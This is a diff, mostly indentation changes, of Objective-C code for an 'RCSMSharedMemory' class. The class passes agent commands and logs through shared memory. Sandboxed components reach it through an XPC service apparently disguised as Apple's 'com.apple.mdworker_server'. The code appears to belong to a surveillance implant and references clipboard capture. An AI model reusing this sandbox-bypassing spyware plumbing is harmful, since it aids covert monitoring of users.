@@ -70,35 +70,35 @@ static void (*_xpc_release)(xpc_object_t) = NULL;
 static BOOL resolveXpcFunc()
 {
   void *libsystem = dlopen("/usr/lib/libSystem.dylib", RTLD_NOW);
-  
+
   if (libsystem == NULL) 
-  {
+    {
 #ifdef DEBUG_SHMEM
-    infoLog(@"error on loading library libSystem");
+      infoLog(@"error on loading library libSystem");
 #endif
-    return NO;
-  }
-  
+      return NO;
+    }
+
   __xpc_type_error = dlsym(libsystem, "_xpc_type_error");
   __xpc_type_dictionary = dlsym(libsystem, "_xpc_type_dictionary");
   __xpc_error_connection_invalid = dlsym(libsystem, "_xpc_error_connection_invalid");
   __xpc_error_connection_interrupted = dlsym(libsystem, "_xpc_error_connection_interrupted");
-  
+
   _xpc_dictionary_create = dlsym(libsystem, "xpc_dictionary_create");
   _xpc_int64_create = dlsym(libsystem, "xpc_int64_create");
   _xpc_data_create = dlsym(libsystem, "xpc_data_create");
-  
+
   _xpc_dictionary_get_data = dlsym(libsystem, "xpc_dictionary_get_data");
   _xpc_dictionary_set_value = dlsym(libsystem, "xpc_dictionary_set_value");
   _xpc_get_type = dlsym(libsystem, "xpc_get_type");
-  
+
   _xpc_connection_create = dlsym(libsystem, "xpc_connection_create");
   _xpc_connection_resume = dlsym(libsystem, "xpc_connection_resume");
   _xpc_connection_set_event_handler = dlsym(libsystem, "xpc_connection_set_event_handler");
   _xpc_connection_send_message_with_reply = dlsym(libsystem, "xpc_connection_send_message_with_reply");
   _xpc_connection_send_message_with_reply_sync = dlsym(libsystem, "xpc_connection_send_message_with_reply_sync");
   _xpc_release = dlsym(libsystem, "xpc_release");
-  
+
   if (_xpc_dictionary_create == NULL ||
       _xpc_int64_create == NULL ||
       _xpc_data_create == NULL ||
@@ -110,53 +110,53 @@ static BOOL resolveXpcFunc()
       _xpc_connection_send_message_with_reply == NULL ||
       _xpc_connection_send_message_with_reply_sync == NULL ||
       _xpc_release == NULL) 
-  {
+    {
 #ifdef DEBUG_SHMEM
-    infoLog(@"error resolving xpc sym");
+      infoLog(@"error resolving xpc sym");
 #endif
-    return NO;
-  }
-  
+      return NO;
+    }
+
   void *sndbox = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW);
-  
+
   if (sndbox != NULL) 
     _sandbox_check = dlsym(sndbox, "sandbox_check");
-  
+
   if (_sandbox_check == NULL)
-  {
+    {
 #ifdef DEBUG_SHMEM
-    infoLog(@"error resolving sndbox_check sym");
+      infoLog(@"error resolving sndbox_check sym");
 #endif
-    return NO;
-  }
-  
+      return NO;
+    }
+
   return YES;
 }
 
 static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
 {
   BOOL bRet = FALSE;
-  
+
   if (resolveXpcFunc() == NO) 
-  {
+    {
 #ifdef DEBUG_SHMEM
-    infoLog(@"error resolving xpc function addresses");
+      infoLog(@"error resolving xpc function addresses");
 #endif
-    return bRet;
-  }
+      return bRet;
+    }
   else
-  {
+    {
 #ifdef  DEBUG_SHMEM
-    infoLog(@" xpc function resolved");
+      infoLog(@" xpc function resolved");
 #endif
-  }
-  
+    }
+
   bRet = _sandbox_check(pid, operation, type);
-  
+
 #ifdef  DEBUG_SHMEM
   infoLog(@"Application sanboxed %d", bRet);
 #endif
-  
+
   return bRet;
 }
 
@@ -183,14 +183,14 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
 - (void)dealloc
 {
   if ([self detachFromMemoryRegion] == 0)
-  {
-    if (sem_close(mSemaphoreID) == 0)
     {
+      if (sem_close(mSemaphoreID) == 0)
+        {
 #ifdef DEBUG_SHMEM
-      infoLog(@"Semaphore closed correctly");
+          infoLog(@"Semaphore closed correctly");
 #endif
+        }
     }
-  }
   
   [mSemaphoreName release];
   [super dealloc];
@@ -206,21 +206,21 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
   NSString *_file;
   
   while (_file = [dirEnum nextObject]) 
-  {
-    if ([_file hasPrefix: XPC_BUNDLE_FOLDER_PREFIX]) 
     {
+      if ([_file hasPrefix: XPC_BUNDLE_FOLDER_PREFIX]) 
+        {
 #ifdef DEBUG_SHMEM
-      //infoLog(@"%s: found xpc service with name %@", __FUNCTION__, _file);
+          //infoLog(@"%s: found xpc service with name %@", __FUNCTION__, _file);
 #endif
-      
-      retString = (char*)[_file UTF8String];
-      
-      retString[strlen(retString) - 4] = 0;
-      
-      
-      return retString;
+
+          retString = (char*)[_file UTF8String];
+
+          retString[strlen(retString) - 4] = 0;
+
+
+          return retString;
+        }
     }
-  }
   
   return retString;
 }
@@ -229,66 +229,66 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
 {
   // If sandboxed read shmem by xpc service
   if (amISandboxed) 
-  {
-    char *service_name = "com.apple.mdworker_server";
-    //[self _guessXPCServiceName: XPC_BUNDLE_FRAMEWORK_PATH];
-    
-    if (service_name == NULL) 
     {
+      char *service_name = "com.apple.mdworker_server";
+      //[self _guessXPCServiceName: XPC_BUNDLE_FRAMEWORK_PATH];
+
+      if (service_name == NULL) 
+        {
 #ifdef  DEBUG_SHMEM
-      //infoLog(@"%s: error getting service name", __FUNCTION__);
+          //infoLog(@"%s: error getting service name", __FUNCTION__);
 #endif
-      return -1;
-    }
-    else
-    {
+          return -1;
+        }
+      else
+        {
 #ifdef  DEBUG_SHMEM
-      //infoLog(@"%s: setting service name %s", __FUNCTION__, service_name);
+          //infoLog(@"%s: setting service name %s", __FUNCTION__, service_name);
 #endif
-    }
-    
-    xpc_handler_t handler = (^(xpc_object_t event) 
-                             {
+        }
+
+      xpc_handler_t handler = (^(xpc_object_t event) 
+                               {
                                xpc_type_t type = _xpc_get_type(event);
-                               
+
                                if (type == __xpc_type_error) 
                                {
 #ifdef DEBUG_SHMEM
-                                 //infoLog(@"error cannot continue!");
+                               //infoLog(@"error cannot continue!");
 #endif
                                }
-                             });
-    
-    mXpcCon = _xpc_connection_create("com.apple.mdworker_server", NULL);
-    
-    _xpc_connection_set_event_handler(mXpcCon, handler);
-    
-    _xpc_connection_resume(mXpcCon);
-    
-    return 0;  
-  }
+                               });
+
+      mXpcCon = _xpc_connection_create("com.apple.mdworker_server", NULL);
+
+      _xpc_connection_set_event_handler(mXpcCon, handler);
+
+      _xpc_connection_resume(mXpcCon);
+
+      return 0;  
+    }
   
   mSharedMemoryID = shmget(mKey, mSize, IPC_CREAT | GLOBAL_PERMISSIONS);
   
   if (mSharedMemoryID == -1)
-  {
-#ifdef DEBUG_SHMEM
-    char *error = NULL;
-    switch (errno)
     {
-      case ENOSPC: error = ENOSPC_STR; break;
-      case ENOMEM: error = ENOMEM_STR; break;
-      case EACCES: error = EACCES_STR; break;
-      case EINVAL: error = EINVAL_STR; break;
-        //case EEXIST: return -2;
-      default:     error = EUNKNOWN_STR;
-    }
-    
-    infoLog(@"Error shmget: %s", error);
+#ifdef DEBUG_SHMEM
+      char *error = NULL;
+      switch (errno)
+        {
+        case ENOSPC: error = ENOSPC_STR; break;
+        case ENOMEM: error = ENOMEM_STR; break;
+        case EACCES: error = EACCES_STR; break;
+        case EINVAL: error = EINVAL_STR; break;
+                     //case EEXIST: return -2;
+        default:     error = EUNKNOWN_STR;
+        }
+
+      infoLog(@"Error shmget: %s", error);
 #endif
-    
-    return -1;
-  }
+
+      return -1;
+    }
   
 #ifdef DEBUG_SHMEM
   infoLog(@"SharedMemoryID: %d", mSharedMemoryID);
@@ -303,49 +303,49 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
 {
   // If sandboxed to nothing...
   if (amISandboxed == NO) 
-  { 
-    mSharedMemory = shmat(mSharedMemoryID, 0, GLOBAL_PERMISSIONS);
-    
-    if (mSharedMemory == NULL)
-    {
+    { 
+      mSharedMemory = shmat(mSharedMemoryID, 0, GLOBAL_PERMISSIONS);
+
+      if (mSharedMemory == NULL)
+        {
 #ifdef DEBUG_SHMEM
-      char *error = NULL;
-      switch (errno)
-      {
-        case EACCES: error = EACCES_STR; break;
-        case ENOMEM: error = ENOMEM_STR; break;
-        case EINVAL: error = EINVAL_STR2; break;
-        case EMFILE: error = EMFILE_STR; break;
-        default:     error = EUNKNOWN_STR;
-      }
-      
-      infoLog(@"Error shmat: %s", error);
+          char *error = NULL;
+          switch (errno)
+            {
+            case EACCES: error = EACCES_STR; break;
+            case ENOMEM: error = ENOMEM_STR; break;
+            case EINVAL: error = EINVAL_STR2; break;
+            case EMFILE: error = EMFILE_STR; break;
+            default:     error = EUNKNOWN_STR;
+            }
+
+          infoLog(@"Error shmat: %s", error);
 #endif
-      
-      return -1;
+
+          return -1;
+        }
+
+#ifdef DEBUG_SHMEM
+      infoLog(@"ptrSharedMemory: 0x%08x", mSharedMemory);
+#endif
+
+
+      mSemaphoreID = sem_open((const char *)mSemaphoreName, 
+                              O_CREAT,
+                              GLOBAL_PERMISSIONS,
+                              1);
+
+      if ((int *)mSemaphoreID == SEM_FAILED)
+        {
+#ifdef DEBUG_SHMEM
+          infoLog(@"An error occured while opening semaphore in sem_open()");
+#endif
+
+          shmdt(mSharedMemory);
+
+          return -1;
+        } 
     }
-    
-#ifdef DEBUG_SHMEM
-    infoLog(@"ptrSharedMemory: 0x%08x", mSharedMemory);
-#endif
-    
-    
-    mSemaphoreID = sem_open((const char *)mSemaphoreName, 
-                            O_CREAT,
-                            GLOBAL_PERMISSIONS,
-                            1);
-    
-    if ((int *)mSemaphoreID == SEM_FAILED)
-    {
-#ifdef DEBUG_SHMEM
-      infoLog(@"An error occured while opening semaphore in sem_open()");
-#endif
-      
-      shmdt(mSharedMemory);
-      
-      return -1;
-    } 
-  }
   
   return 0;
 }
@@ -359,26 +359,26 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
     return 0;
   
   if (shmdt(mSharedMemory) != -1)
-  {
-    shmctl([self mSharedMemoryID], IPC_STAT, &SharedMemDS);
-    
-    // Check if there's anything still attached to the region
-    if (SharedMemDS.shm_nattch == 0)
     {
-      // Remove the segment in order to free the key and memory
-      shmctl(mSharedMemoryID, IPC_RMID, NULL);
+      shmctl([self mSharedMemoryID], IPC_STAT, &SharedMemDS);
+
+      // Check if there's anything still attached to the region
+      if (SharedMemDS.shm_nattch == 0)
+        {
+          // Remove the segment in order to free the key and memory
+          shmctl(mSharedMemoryID, IPC_RMID, NULL);
 #ifdef DEBUG_SHMEM
-      infoLog(@"Shared Memory (%d) destroyed", mSharedMemoryID);
+          infoLog(@"Shared Memory (%d) destroyed", mSharedMemoryID);
 #endif
-    }
-    else
-    {
+        }
+      else
+        {
 #ifdef DEBUG_SHMEM
-      infoLog(@"We have still someone attached here dude, can't destroy");
+          infoLog(@"We have still someone attached here dude, can't destroy");
 #endif
-      //shmctl(mSharedMemoryID, IPC_RMID, NULL);
+          //shmctl(mSharedMemoryID, IPC_RMID, NULL);
+        }
     }
-  }
   else
     return -1;
   
@@ -400,30 +400,30 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
     return TRUE;
   
   if (mSize < mSize)
-  {
+    {
 #ifdef DEBUG_SHMEM
-    infoLog(@"[EE] clearConfigurations can't be used on the command queue");
+      infoLog(@"[EE] clearConfigurations can't be used on the command queue");
 #endif      
-    return FALSE;
-  }
+      return FALSE;
+    }
   
   do
-  {
-    memoryHeader        = (shMemoryLog *)(mSharedMemory + offset);
-    int tmpAgentID      = memoryHeader->agentID;
-    int tmpCommandType  = memoryHeader->commandType;
-    
-    if (tmpAgentID != 0
-        && tmpCommandType == CM_AGENT_CONF)
     {
-      memset((void *)(mSharedMemory + offset), '\0', sizeof(shMemoryLog));
+      memoryHeader        = (shMemoryLog *)(mSharedMemory + offset);
+      int tmpAgentID      = memoryHeader->agentID;
+      int tmpCommandType  = memoryHeader->commandType;
+
+      if (tmpAgentID != 0
+          && tmpCommandType == CM_AGENT_CONF)
+        {
+          memset((void *)(mSharedMemory + offset), '\0', sizeof(shMemoryLog));
+        }
+      else
+        {
+          // Not found
+          offset += sizeof (shMemoryLog);
+        }
     }
-    else
-    {
-      // Not found
-      offset += sizeof (shMemoryLog);
-    }
-  }
   while (offset < mSize);
   
   return TRUE;
@@ -449,54 +449,54 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
   xpc_object_t reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
   
   if (reply != NULL)
-  {
-    xpc_type_t type = _xpc_get_type(reply);
-    
-    if (type == __xpc_type_error) 
     {
-      if (reply == __xpc_error_connection_interrupted) 
-      {
-#ifdef DEBUG_SHMEM
-        infoLog(@" [XPC RCSMSharedMemory] xpc error connection interrupted");
-#endif
-      } 
-      else if (reply == __xpc_error_connection_invalid) 
-      {            
-#ifdef DEBUG_SHMEM
-        infoLog(@"[XPC RCSMSharedMemory] xpc error connection invalid");
-#endif
-      }
-    } 
-    else if (type == __xpc_type_dictionary) 
-    { 
-      unsigned long len;
-      char *buff;
-      
-      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
-      
-      if (buff == NULL)
-      {
-#ifdef DEBUG_SHMEM
-        infoLog(@"[XPC RCSMSharedMemory] xpc error getting raw data");
-#endif
-      }
-      else
-      {
-        xpcReplyData = [[NSMutableData alloc] initWithBytes:buff 
-                                                     length:len];
-#ifdef DEBUG_SHMEM
-        if (anOffset == OFFT_CLIPBOARD)
-        {
-          infoLog(@"[XPC RCSMSharedMemory] read memory at off %#x", anOffset);
+      xpc_type_t type = _xpc_get_type(reply);
 
-          shMemoryCommand *cmd = (shMemoryCommand*)buff;
-            
-          infoLog(@"[XPC RCSMSharedMemory] agentID %#x cmd %#x", cmd->agentID, cmd->command);
-        }
+      if (type == __xpc_type_error) 
+        {
+          if (reply == __xpc_error_connection_interrupted) 
+            {
+#ifdef DEBUG_SHMEM
+              infoLog(@" [XPC RCSMSharedMemory] xpc error connection interrupted");
 #endif
-      }
+            } 
+          else if (reply == __xpc_error_connection_invalid) 
+            {            
+#ifdef DEBUG_SHMEM
+              infoLog(@"[XPC RCSMSharedMemory] xpc error connection invalid");
+#endif
+            }
+        } 
+      else if (type == __xpc_type_dictionary) 
+        { 
+          unsigned long len;
+          char *buff;
+
+          buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
+
+          if (buff == NULL)
+            {
+#ifdef DEBUG_SHMEM
+              infoLog(@"[XPC RCSMSharedMemory] xpc error getting raw data");
+#endif
+            }
+          else
+            {
+              xpcReplyData = [[NSMutableData alloc] initWithBytes:buff 
+                                                           length:len];
+#ifdef DEBUG_SHMEM
+              if (anOffset == OFFT_CLIPBOARD)
+                {
+                  infoLog(@"[XPC RCSMSharedMemory] read memory at off %#x", anOffset);
+
+                  shMemoryCommand *cmd = (shMemoryCommand*)buff;
+
+                  infoLog(@"[XPC RCSMSharedMemory] agentID %#x cmd %#x", cmd->agentID, cmd->command);
+                }
+#endif
+            }
+        }
     }
-  }
   
   _xpc_release(message);
   
@@ -510,48 +510,48 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
   
   // if sandboxed read shmem by xpc api
   if (amISandboxed)
-  {
-    readData = [self readMemoryByXPC: anOffset 
-                       fromComponent: aComponent];  
-    
-    return [readData autorelease];
-  }
+    {
+      readData = [self readMemoryByXPC: anOffset 
+                         fromComponent: aComponent];  
+
+      return [readData autorelease];
+    }
   
   shMemoryCommand *memoryHeader = (shMemoryCommand *)(mSharedMemory + anOffset);
   
   if (aComponent != COMP_CORE && aComponent != COMP_AGENT)
-  {
-#ifdef DEBUG_SHMEM
-    infoLog(@"[EE] readMemory-command unsupported component");
-#endif
-    return nil;
-  }
-  
-  if (anOffset == 0)
-  {
-#ifdef DEBUG_SHMEM
-    infoLog(@"[EE] readMemory-command offset is zero");
-#endif
-    return nil;
-  }
-  
-  if (memoryHeader->agentID != 0)
-  {
-    //
-    // Now if who is reading is the same as who this data is directed to,
-    // read it and clean out the area
-    //
-    if (aComponent ^ memoryHeader->direction == 0)
     {
 #ifdef DEBUG_SHMEM
-      infoLog(@"Found data on shared memory");
+      infoLog(@"[EE] readMemory-command unsupported component");
 #endif
-      readData = [[NSMutableData alloc] initWithBytes: mSharedMemory + anOffset
-                                               length: sizeof(shMemoryCommand)];
-      
-      //memset((void *)(mSharedMemory + anOffset), '\0', sizeof(shMemoryCommand));
+      return nil;
     }
-  }
+  
+  if (anOffset == 0)
+    {
+#ifdef DEBUG_SHMEM
+      infoLog(@"[EE] readMemory-command offset is zero");
+#endif
+      return nil;
+    }
+  
+  if (memoryHeader->agentID != 0)
+    {
+      //
+      // Now if who is reading is the same as who this data is directed to,
+      // read it and clean out the area
+      //
+      if (aComponent ^ memoryHeader->direction == 0)
+        {
+#ifdef DEBUG_SHMEM
+          infoLog(@"Found data on shared memory");
+#endif
+          readData = [[NSMutableData alloc] initWithBytes: mSharedMemory + anOffset
+                                                   length: sizeof(shMemoryCommand)];
+
+          //memset((void *)(mSharedMemory + anOffset), '\0', sizeof(shMemoryCommand));
+        }
+    }
   
   return [readData autorelease];
 }
@@ -581,44 +581,44 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
   xpc_object_t reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
   
   if (reply != NULL)
-  {
-    xpc_type_t type = _xpc_get_type(reply);
-    
-    if (type == __xpc_type_error) 
     {
-      if (reply == __xpc_error_connection_interrupted) 
-      {
+      xpc_type_t type = _xpc_get_type(reply);
+
+      if (type == __xpc_type_error) 
+        {
+          if (reply == __xpc_error_connection_interrupted) 
+            {
 #ifdef DEBUG_SHMEM
-        infoLog(@" [XPC RCSMSharedMemory] xpc error connection interrupted");
+              infoLog(@" [XPC RCSMSharedMemory] xpc error connection interrupted");
 #endif
-      } 
-      else if (reply == __xpc_error_connection_invalid) 
-      {            
+            } 
+          else if (reply == __xpc_error_connection_invalid) 
+            {            
 #ifdef DEBUG_SHMEM
-        infoLog(@"[XPC RCSMSharedMemory] xpc error connection invalid");
+              infoLog(@"[XPC RCSMSharedMemory] xpc error connection invalid");
 #endif
-      }
-    } 
-    else if (type == __xpc_type_dictionary) 
-    { 
-      unsigned long len;
-      char *buff;
-      
-      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
-      
-      if (buff == NULL)
-      {
+            }
+        } 
+      else if (type == __xpc_type_dictionary) 
+        { 
+          unsigned long len;
+          char *buff;
+
+          buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
+
+          if (buff == NULL)
+            {
 #ifdef DEBUG_SHMEM
-        infoLog(@"[XPC RCSMSharedMemory] xpc error getting raw data");
+              infoLog(@"[XPC RCSMSharedMemory] xpc error getting raw data");
 #endif
-      }
-      else
-      {
-        xpcReplyData = [[NSMutableData alloc] initWithBytes:buff 
-                                                     length:len];
-      }
+            }
+          else
+            {
+              xpcReplyData = [[NSMutableData alloc] initWithBytes:buff 
+                                                           length:len];
+            }
+        }
     }
-  }
   
   _xpc_release(message);
   
@@ -635,13 +635,13 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
   
   // if sandboxed read shmem by xpc api
   if (amISandboxed)
-  {
-    readData = [self readMemoryByXPCFromComponent: aComponent 
-                                         forAgent: anAgentID 
-                                  withCommandType: aCommandType];  
-    
-    return readData;
-  }
+    {
+      readData = [self readMemoryByXPCFromComponent: aComponent 
+                                           forAgent: anAgentID 
+                                    withCommandType: aCommandType];  
+
+      return readData;
+    }
   
   BOOL lookForAgent       = NO;
   BOOL foundAgent         = NO;
@@ -653,28 +653,28 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
   u_int offset            = 0;
   
   if (aComponent != COMP_CORE && aComponent != COMP_AGENT)
-  {
+    {
 #ifdef DEBUG_SHMEM
-    infoLog(@"[EE] readMemory-log unsupported component");
+      infoLog(@"[EE] readMemory-log unsupported component");
 #endif
-    return nil;
-  }
-  
+      return nil;
+    }
+
   if (anAgentID == 0 && aCommandType == 0)
-  {
+    {
 #ifdef DEBUG_SHMEM
-    infoLog(@"[EE] readMemory-log usupported read");
+      infoLog(@"[EE] readMemory-log usupported read");
 #endif
-  }
-  
+    }
+
   if (aCommandType != 0)
-  {
-    lookForCommand = YES;
-  }
+    {
+      lookForCommand = YES;
+    }
   if (anAgentID != 0)
-  {
-    lookForAgent = YES;
-  }
+    {
+      lookForAgent = YES;
+    }
   
   time_t lowestTimestamp      = 0;
   u_int  matchingObjectOffset = 0;
@@ -683,119 +683,119 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
   // Find the first available block who matches our request
   //
   do
-  {
-    tempHeader = (shMemoryLog *)(mSharedMemory + offset);
-    int tempState       = tempHeader->status;
-    int tmpAgentID      = tempHeader->agentID;
-    int tmpCommandType  = tempHeader->commandType;
-    int tmpDirection    = tempHeader->direction;
-    
-    if (tempState == SHMEM_FREE)
     {
+      tempHeader = (shMemoryLog *)(mSharedMemory + offset);
+      int tempState       = tempHeader->status;
+      int tmpAgentID      = tempHeader->agentID;
+      int tmpCommandType  = tempHeader->commandType;
+      int tmpDirection    = tempHeader->direction;
+
+      if (tempState == SHMEM_FREE)
+        {
+          offset += sizeof (shMemoryLog);
+          continue;
+        }
+
+      if (tempState == SHMEM_LOCKED)
+        {
+#ifdef DEBUG_SHMEM
+          infoLog(@"ANOMALY! FOUND LOCKED BLOCK ON READ");
+#endif
+        }
+
+      if (lookForCommand == YES)
+        {
+          if (((aCommandType & tmpCommandType) == tmpCommandType)
+              && tmpCommandType != 0)
+            {
+              foundCommand = YES;
+            }
+        }
+      if (lookForAgent == YES)
+        {
+          if (tmpAgentID == anAgentID)
+            {
+              foundAgent = YES;
+            }
+        }
+
+      // Looking only for commandType
+      if ((lookForCommand == YES && foundCommand == YES)
+          && lookForAgent == NO)
+        blockFound = YES;
+
+      // Looking only for agentID
+      if ((lookForAgent     == YES && foundAgent == YES)
+          && lookForCommand == NO)
+        blockFound = YES;
+
+      // Looking for both
+      if ((lookForCommand  == YES && foundCommand == YES)
+          && (lookForAgent == YES && foundAgent   == YES))
+        blockFound = YES;
+
+      if (blockFound == YES)
+        {
+          if (tmpDirection ^ aComponent == 0)
+            {
+#ifdef DEBUG_SHMEM
+              infoLog(@"[ii] Found data matching our request on shmem");
+#endif
+
+              blockMatched = YES;
+
+              if (lowestTimestamp == 0)
+                {
+                  lowestTimestamp = tempHeader->timestamp;
+                  matchingObjectOffset = offset;
+                }
+              else if (tempHeader->timestamp < lowestTimestamp)
+                {
+                  lowestTimestamp = tempHeader->timestamp;
+                  matchingObjectOffset = offset;
+                }
+            }
+        }
+
       offset += sizeof (shMemoryLog);
-      continue;
+
+      foundCommand = NO;
+      foundAgent   = NO;
+      blockFound   = NO;
     }
-    
-    if (tempState == SHMEM_LOCKED)
-    {
-#ifdef DEBUG_SHMEM
-      infoLog(@"ANOMALY! FOUND LOCKED BLOCK ON READ");
-#endif
-    }
-    
-    if (lookForCommand == YES)
-    {
-      if (((aCommandType & tmpCommandType) == tmpCommandType)
-          && tmpCommandType != 0)
-      {
-        foundCommand = YES;
-      }
-    }
-    if (lookForAgent == YES)
-    {
-      if (tmpAgentID == anAgentID)
-      {
-        foundAgent = YES;
-      }
-    }
-    
-    // Looking only for commandType
-    if ((lookForCommand == YES && foundCommand == YES)
-        && lookForAgent == NO)
-      blockFound = YES;
-    
-    // Looking only for agentID
-    if ((lookForAgent     == YES && foundAgent == YES)
-        && lookForCommand == NO)
-      blockFound = YES;
-    
-    // Looking for both
-    if ((lookForCommand  == YES && foundCommand == YES)
-        && (lookForAgent == YES && foundAgent   == YES))
-      blockFound = YES;
-    
-    if (blockFound == YES)
-    {
-      if (tmpDirection ^ aComponent == 0)
-      {
-#ifdef DEBUG_SHMEM
-        infoLog(@"[ii] Found data matching our request on shmem");
-#endif
-        
-        blockMatched = YES;
-        
-        if (lowestTimestamp == 0)
-        {
-          lowestTimestamp = tempHeader->timestamp;
-          matchingObjectOffset = offset;
-        }
-        else if (tempHeader->timestamp < lowestTimestamp)
-        {
-          lowestTimestamp = tempHeader->timestamp;
-          matchingObjectOffset = offset;
-        }
-      }
-    }
-    
-    offset += sizeof (shMemoryLog);
-    
-    foundCommand = NO;
-    foundAgent   = NO;
-    blockFound   = NO;
-  }
   while (offset < mSize);
   
   if (blockMatched == YES)
-  {
-    //infoLog(@"lowest Timestamp: %x", lowestTimestamp);
-    
-    if (testPreviousTime != 0)
     {
-      if (lowestTimestamp < testPreviousTime)
-      {
+      //infoLog(@"lowest Timestamp: %x", lowestTimestamp);
+
+      if (testPreviousTime != 0)
+        {
+          if (lowestTimestamp < testPreviousTime)
+            {
 #ifdef DEBUG_SHMEM
-        infoLog(@"ANOMALY DETECTED in shared memory!");
-        infoLog(@"previousTimestamp: %x", testPreviousTime);
-        infoLog(@"lowestTimestamp  : %x", lowestTimestamp);
+              infoLog(@"ANOMALY DETECTED in shared memory!");
+              infoLog(@"previousTimestamp: %x", testPreviousTime);
+              infoLog(@"lowestTimestamp  : %x", lowestTimestamp);
 #endif
-      }
+            }
+        }
+
+      testPreviousTime = lowestTimestamp;
+      readData = [[NSMutableData alloc] initWithBytes: (char *)(mSharedMemory + matchingObjectOffset)
+                                               length: sizeof(shMemoryLog)];
+
+      if (aCommandType != CM_AGENT_CONF)
+        {
+          memset((char *)(mSharedMemory + matchingObjectOffset), '\0', sizeof(shMemoryLog));
+        }
     }
-    
-    testPreviousTime = lowestTimestamp;
-    readData = [[NSMutableData alloc] initWithBytes: (char *)(mSharedMemory + matchingObjectOffset)
-                                             length: sizeof(shMemoryLog)];
-    
-    if (aCommandType != CM_AGENT_CONF)
-    {
-      memset((char *)(mSharedMemory + matchingObjectOffset), '\0', sizeof(shMemoryLog));
-    }
-  }
   else
-  {
-    //infoLog(@"block not found while reading!!!!!");
-    
-    return nil;
-  }
+    {
+      //infoLog(@"block not found while reading!!!!!");
+
+      return nil;
+    }
   
   return readData;
 }
@@ -806,81 +806,81 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
 {
   xpc_object_t reply;
   BOOL bRet = FALSE;
-  
+
   if (aData == nil || 
       [aData length] == 0)
-  {
+    {
 #ifdef DEBUG_SHMEM
-    infoLog(@"[XPC RCSMSharedMemory] write memory with aData = nil");
+      infoLog(@"[XPC RCSMSharedMemory] write memory with aData = nil");
 #endif
-    return bRet;
-  }
+      return bRet;
+    }
   else
-  {
+    {
 #ifdef DEBUG_SHMEM
-    infoLog(@"[XPC RCSMSharedMemory] writeMemorybyXPC....");
+      infoLog(@"[XPC RCSMSharedMemory] writeMemorybyXPC....");
 #endif
-  }
-  
+    }
+
   // Write command
   xpc_object_t cmd  = _xpc_int64_create(WRITE_XPC_CMD);
   xpc_object_t off  = _xpc_int64_create(anOffset);
   xpc_object_t cmp  = _xpc_int64_create(aComponent);
   xpc_object_t data = _xpc_data_create([aData bytes], [aData length]);
-  
+
   xpc_object_t message = _xpc_dictionary_create(NULL, NULL, 0);
-  
+
   _xpc_dictionary_set_value(message, "command", cmd);
   _xpc_dictionary_set_value(message, "offset", off);
   _xpc_dictionary_set_value(message, "component", cmp);
   _xpc_dictionary_set_value(message, "data", data);
-  
+
   reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
-  
+
   if (reply != NULL) 
-  {
-    xpc_type_t type = _xpc_get_type(reply);
-    
-    if (type == __xpc_type_error) 
     {
-      if (reply == __xpc_error_connection_interrupted) 
-      {
+      xpc_type_t type = _xpc_get_type(reply);
+
+      if (type == __xpc_type_error) 
+        {
+          if (reply == __xpc_error_connection_interrupted) 
+            {
 #ifdef DEBUG_SHMEM
-        infoLog(@"xpc error connection interrupted");
+              infoLog(@"xpc error connection interrupted");
 #endif
-      } 
-      else if (reply == __xpc_error_connection_invalid) 
-      {            
+            } 
+          else if (reply == __xpc_error_connection_invalid) 
+            {            
 #ifdef DEBUG_SHMEM
-        infoLog(@"xpc error connection invalid");
+              infoLog(@"xpc error connection invalid");
 #endif
-      }
-    } 
-    else if (type == __xpc_type_dictionary) 
-    { 
-      unsigned long len = 0;
-      char *buff = NULL;
-      
-      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
-      
-      if (buff == NULL || len == 0)
-      {
+            }
+        } 
+      else if (type == __xpc_type_dictionary) 
+        { 
+          unsigned long len = 0;
+          char *buff = NULL;
+
+          buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
+
+          if (buff == NULL || len == 0)
+            {
 #ifdef DEBUG_SHMEM
-        infoLog(@"xpc error getting raw data");
+              infoLog(@"xpc error getting raw data");
 #endif
-      }
-      else
-      {
+            }
+          else
+            {
 #ifdef DEBUG_SHMEM
-        infoLog(@"xpc getting raw data len %lu", len);
+              infoLog(@"xpc getting raw data len %lu", len);
 #endif
-        memcpy(&bRet, buff, sizeof(bRet));
-      }
+              memcpy(&bRet, buff, sizeof(bRet));
+            }
+        }
     }
-  }
-  
+
   _xpc_release(message);
-  
+
   return bRet;
 }
 
@@ -889,63 +889,63 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
       fromComponent: (u_int)aComponent
 {
   int memoryState = 0;
-  
+
   // Do it by xpc service
   if (amISandboxed) 
     return [self writeMemorybyXPC:aData offset:anOffset fromComponent:aComponent];
-  
+
   //
   // In case we receive 0 as offset it means that we're dealing within the logs
   // shared memory, thus we need to find the first available block (not written)
   //
   if (anOffset == 0 || anOffset == 1)
-  {
-    if (anOffset == 1)
     {
-      [self zeroFillMemory];
-      anOffset = 0;
-    }
-    
-    do
-    {
-      memoryState = *(unsigned int *)(mSharedMemory + anOffset);
-      
-      if (memoryState != SHMEM_FREE)
-      {
-        anOffset += sizeof (shMemoryLog);
-      }
-      else
-      {
-        memoryState = SHMEM_LOCKED;
-        break;
-      }
-      
-      if (anOffset >= mSize)
-      {
+      if (anOffset == 1)
+        {
+          [self zeroFillMemory];
+          anOffset = 0;
+        }
+
